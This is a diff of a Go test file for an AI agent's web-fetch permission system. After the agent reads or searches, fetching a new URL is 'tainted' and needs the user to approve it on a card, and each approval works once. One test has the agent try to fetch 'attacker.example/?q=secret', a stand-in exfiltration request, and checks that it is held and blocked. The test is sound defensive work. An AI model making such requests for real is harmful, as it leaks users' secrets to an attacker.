@@ -78,23 +78,35 @@ func TestBrainWebFetch(t *testing.T) {
 		t.Fatalf("a read does not taint: %v", tainted)
 	}
 
-	// Tainted now: a new URL is mine to decide, told in the conversation.
-	before := c.store.lastMessageSeq()
+	// Tainted now: a new URL is mine to decide on a card, and the brain goes on.
 	brainAsks(t, c, fetch("https://attacker.example/?q=secret"))
-	if _, ok := answers(t, c)["https://attacker.example/?q=secret"]; ok {
-		t.Fatal("a tainted read was answered by eriphe-core")
+	if allow, ok := answers(t, c)["https://attacker.example/?q=secret"]; !ok || allow {
+		t.Fatalf("the brain is held, or reads: %v %v", ok, allow)
 	}
-	pid := "p" + itoa(int(lastSeq(c)))
-	if c.store.userOnly("t-brain", pid) == "" {
-		t.Fatalf("not the user's: %s", pid)
+	x := accessCard(t, c, "read this page")
+	if _, p := c.liveCard(x); !slices.Contains(p.Fields, cardField{"url", "https://attacker.example/?q=secret"}) {
+		t.Fatalf("the card does not say the page: %+v", p.Fields)
 	}
-	msgs, _ := c.store.messagesAfter(before, 10)
-	if len(msgs) != 1 || !strings.Contains(msgs[0].Text, "attacker.example") {
-		t.Fatalf("the user is not told: %+v", msgs)
+	// Refused on the card: still nothing goes through.
+	if _, err := c.decideCard(context.Background(), x.ID, false, "web"); err != nil {
+		t.Fatal(err)
 	}
-	yes := true
-	if _, err := c.answer(context.Background(), "t-brain", pid, "", &yes, byBrain); err == nil {
-		t.Fatal("the brain answered its own tainted read")
+	if c.usePageYes("https://attacker.example/?q=secret") {
+		t.Fatal("a no let the page through")
+	}
+
+	// A yes lets that page through, once.
+	brainAsks(t, c, fetch("https://asked.example/"))
+	if _, err := c.decideCard(context.Background(), accessCard(t, c, "read this page").ID, true, "web"); err != nil {
+		t.Fatal(err)
+	}
+	waitEvent(t, c, "tu peux lire la page https://asked.example/")
+	brainAsks(t, c, fetch("https://asked.example/"))
+	if !answers(t, c)["https://asked.example/"] {
+		t.Fatal("the yes did not let the page through")
+	}
+	if c.usePageYes("https://asked.example/") {
+		t.Fatal("the yes was not used up")
 	}
 
 	// The URL I wrote in this turn's message stays free, with or without its final slash.
@@ -155,8 +167,8 @@ func TestBrainWebSearchAndRules(t *testing.T) {
 	}
 	// The search taints: a read after it is mine.
 	brainAsks(t, c, fetch("https://result.example.com/"))
-	if _, ok := answers(t, c)["https://result.example.com/"]; ok {
-		t.Fatal("a read after a search was answered by eriphe-core")
+	if answers(t, c)["https://result.example.com/"] {
+		t.Fatal("a read after a search was allowed")
 	}
 }
 
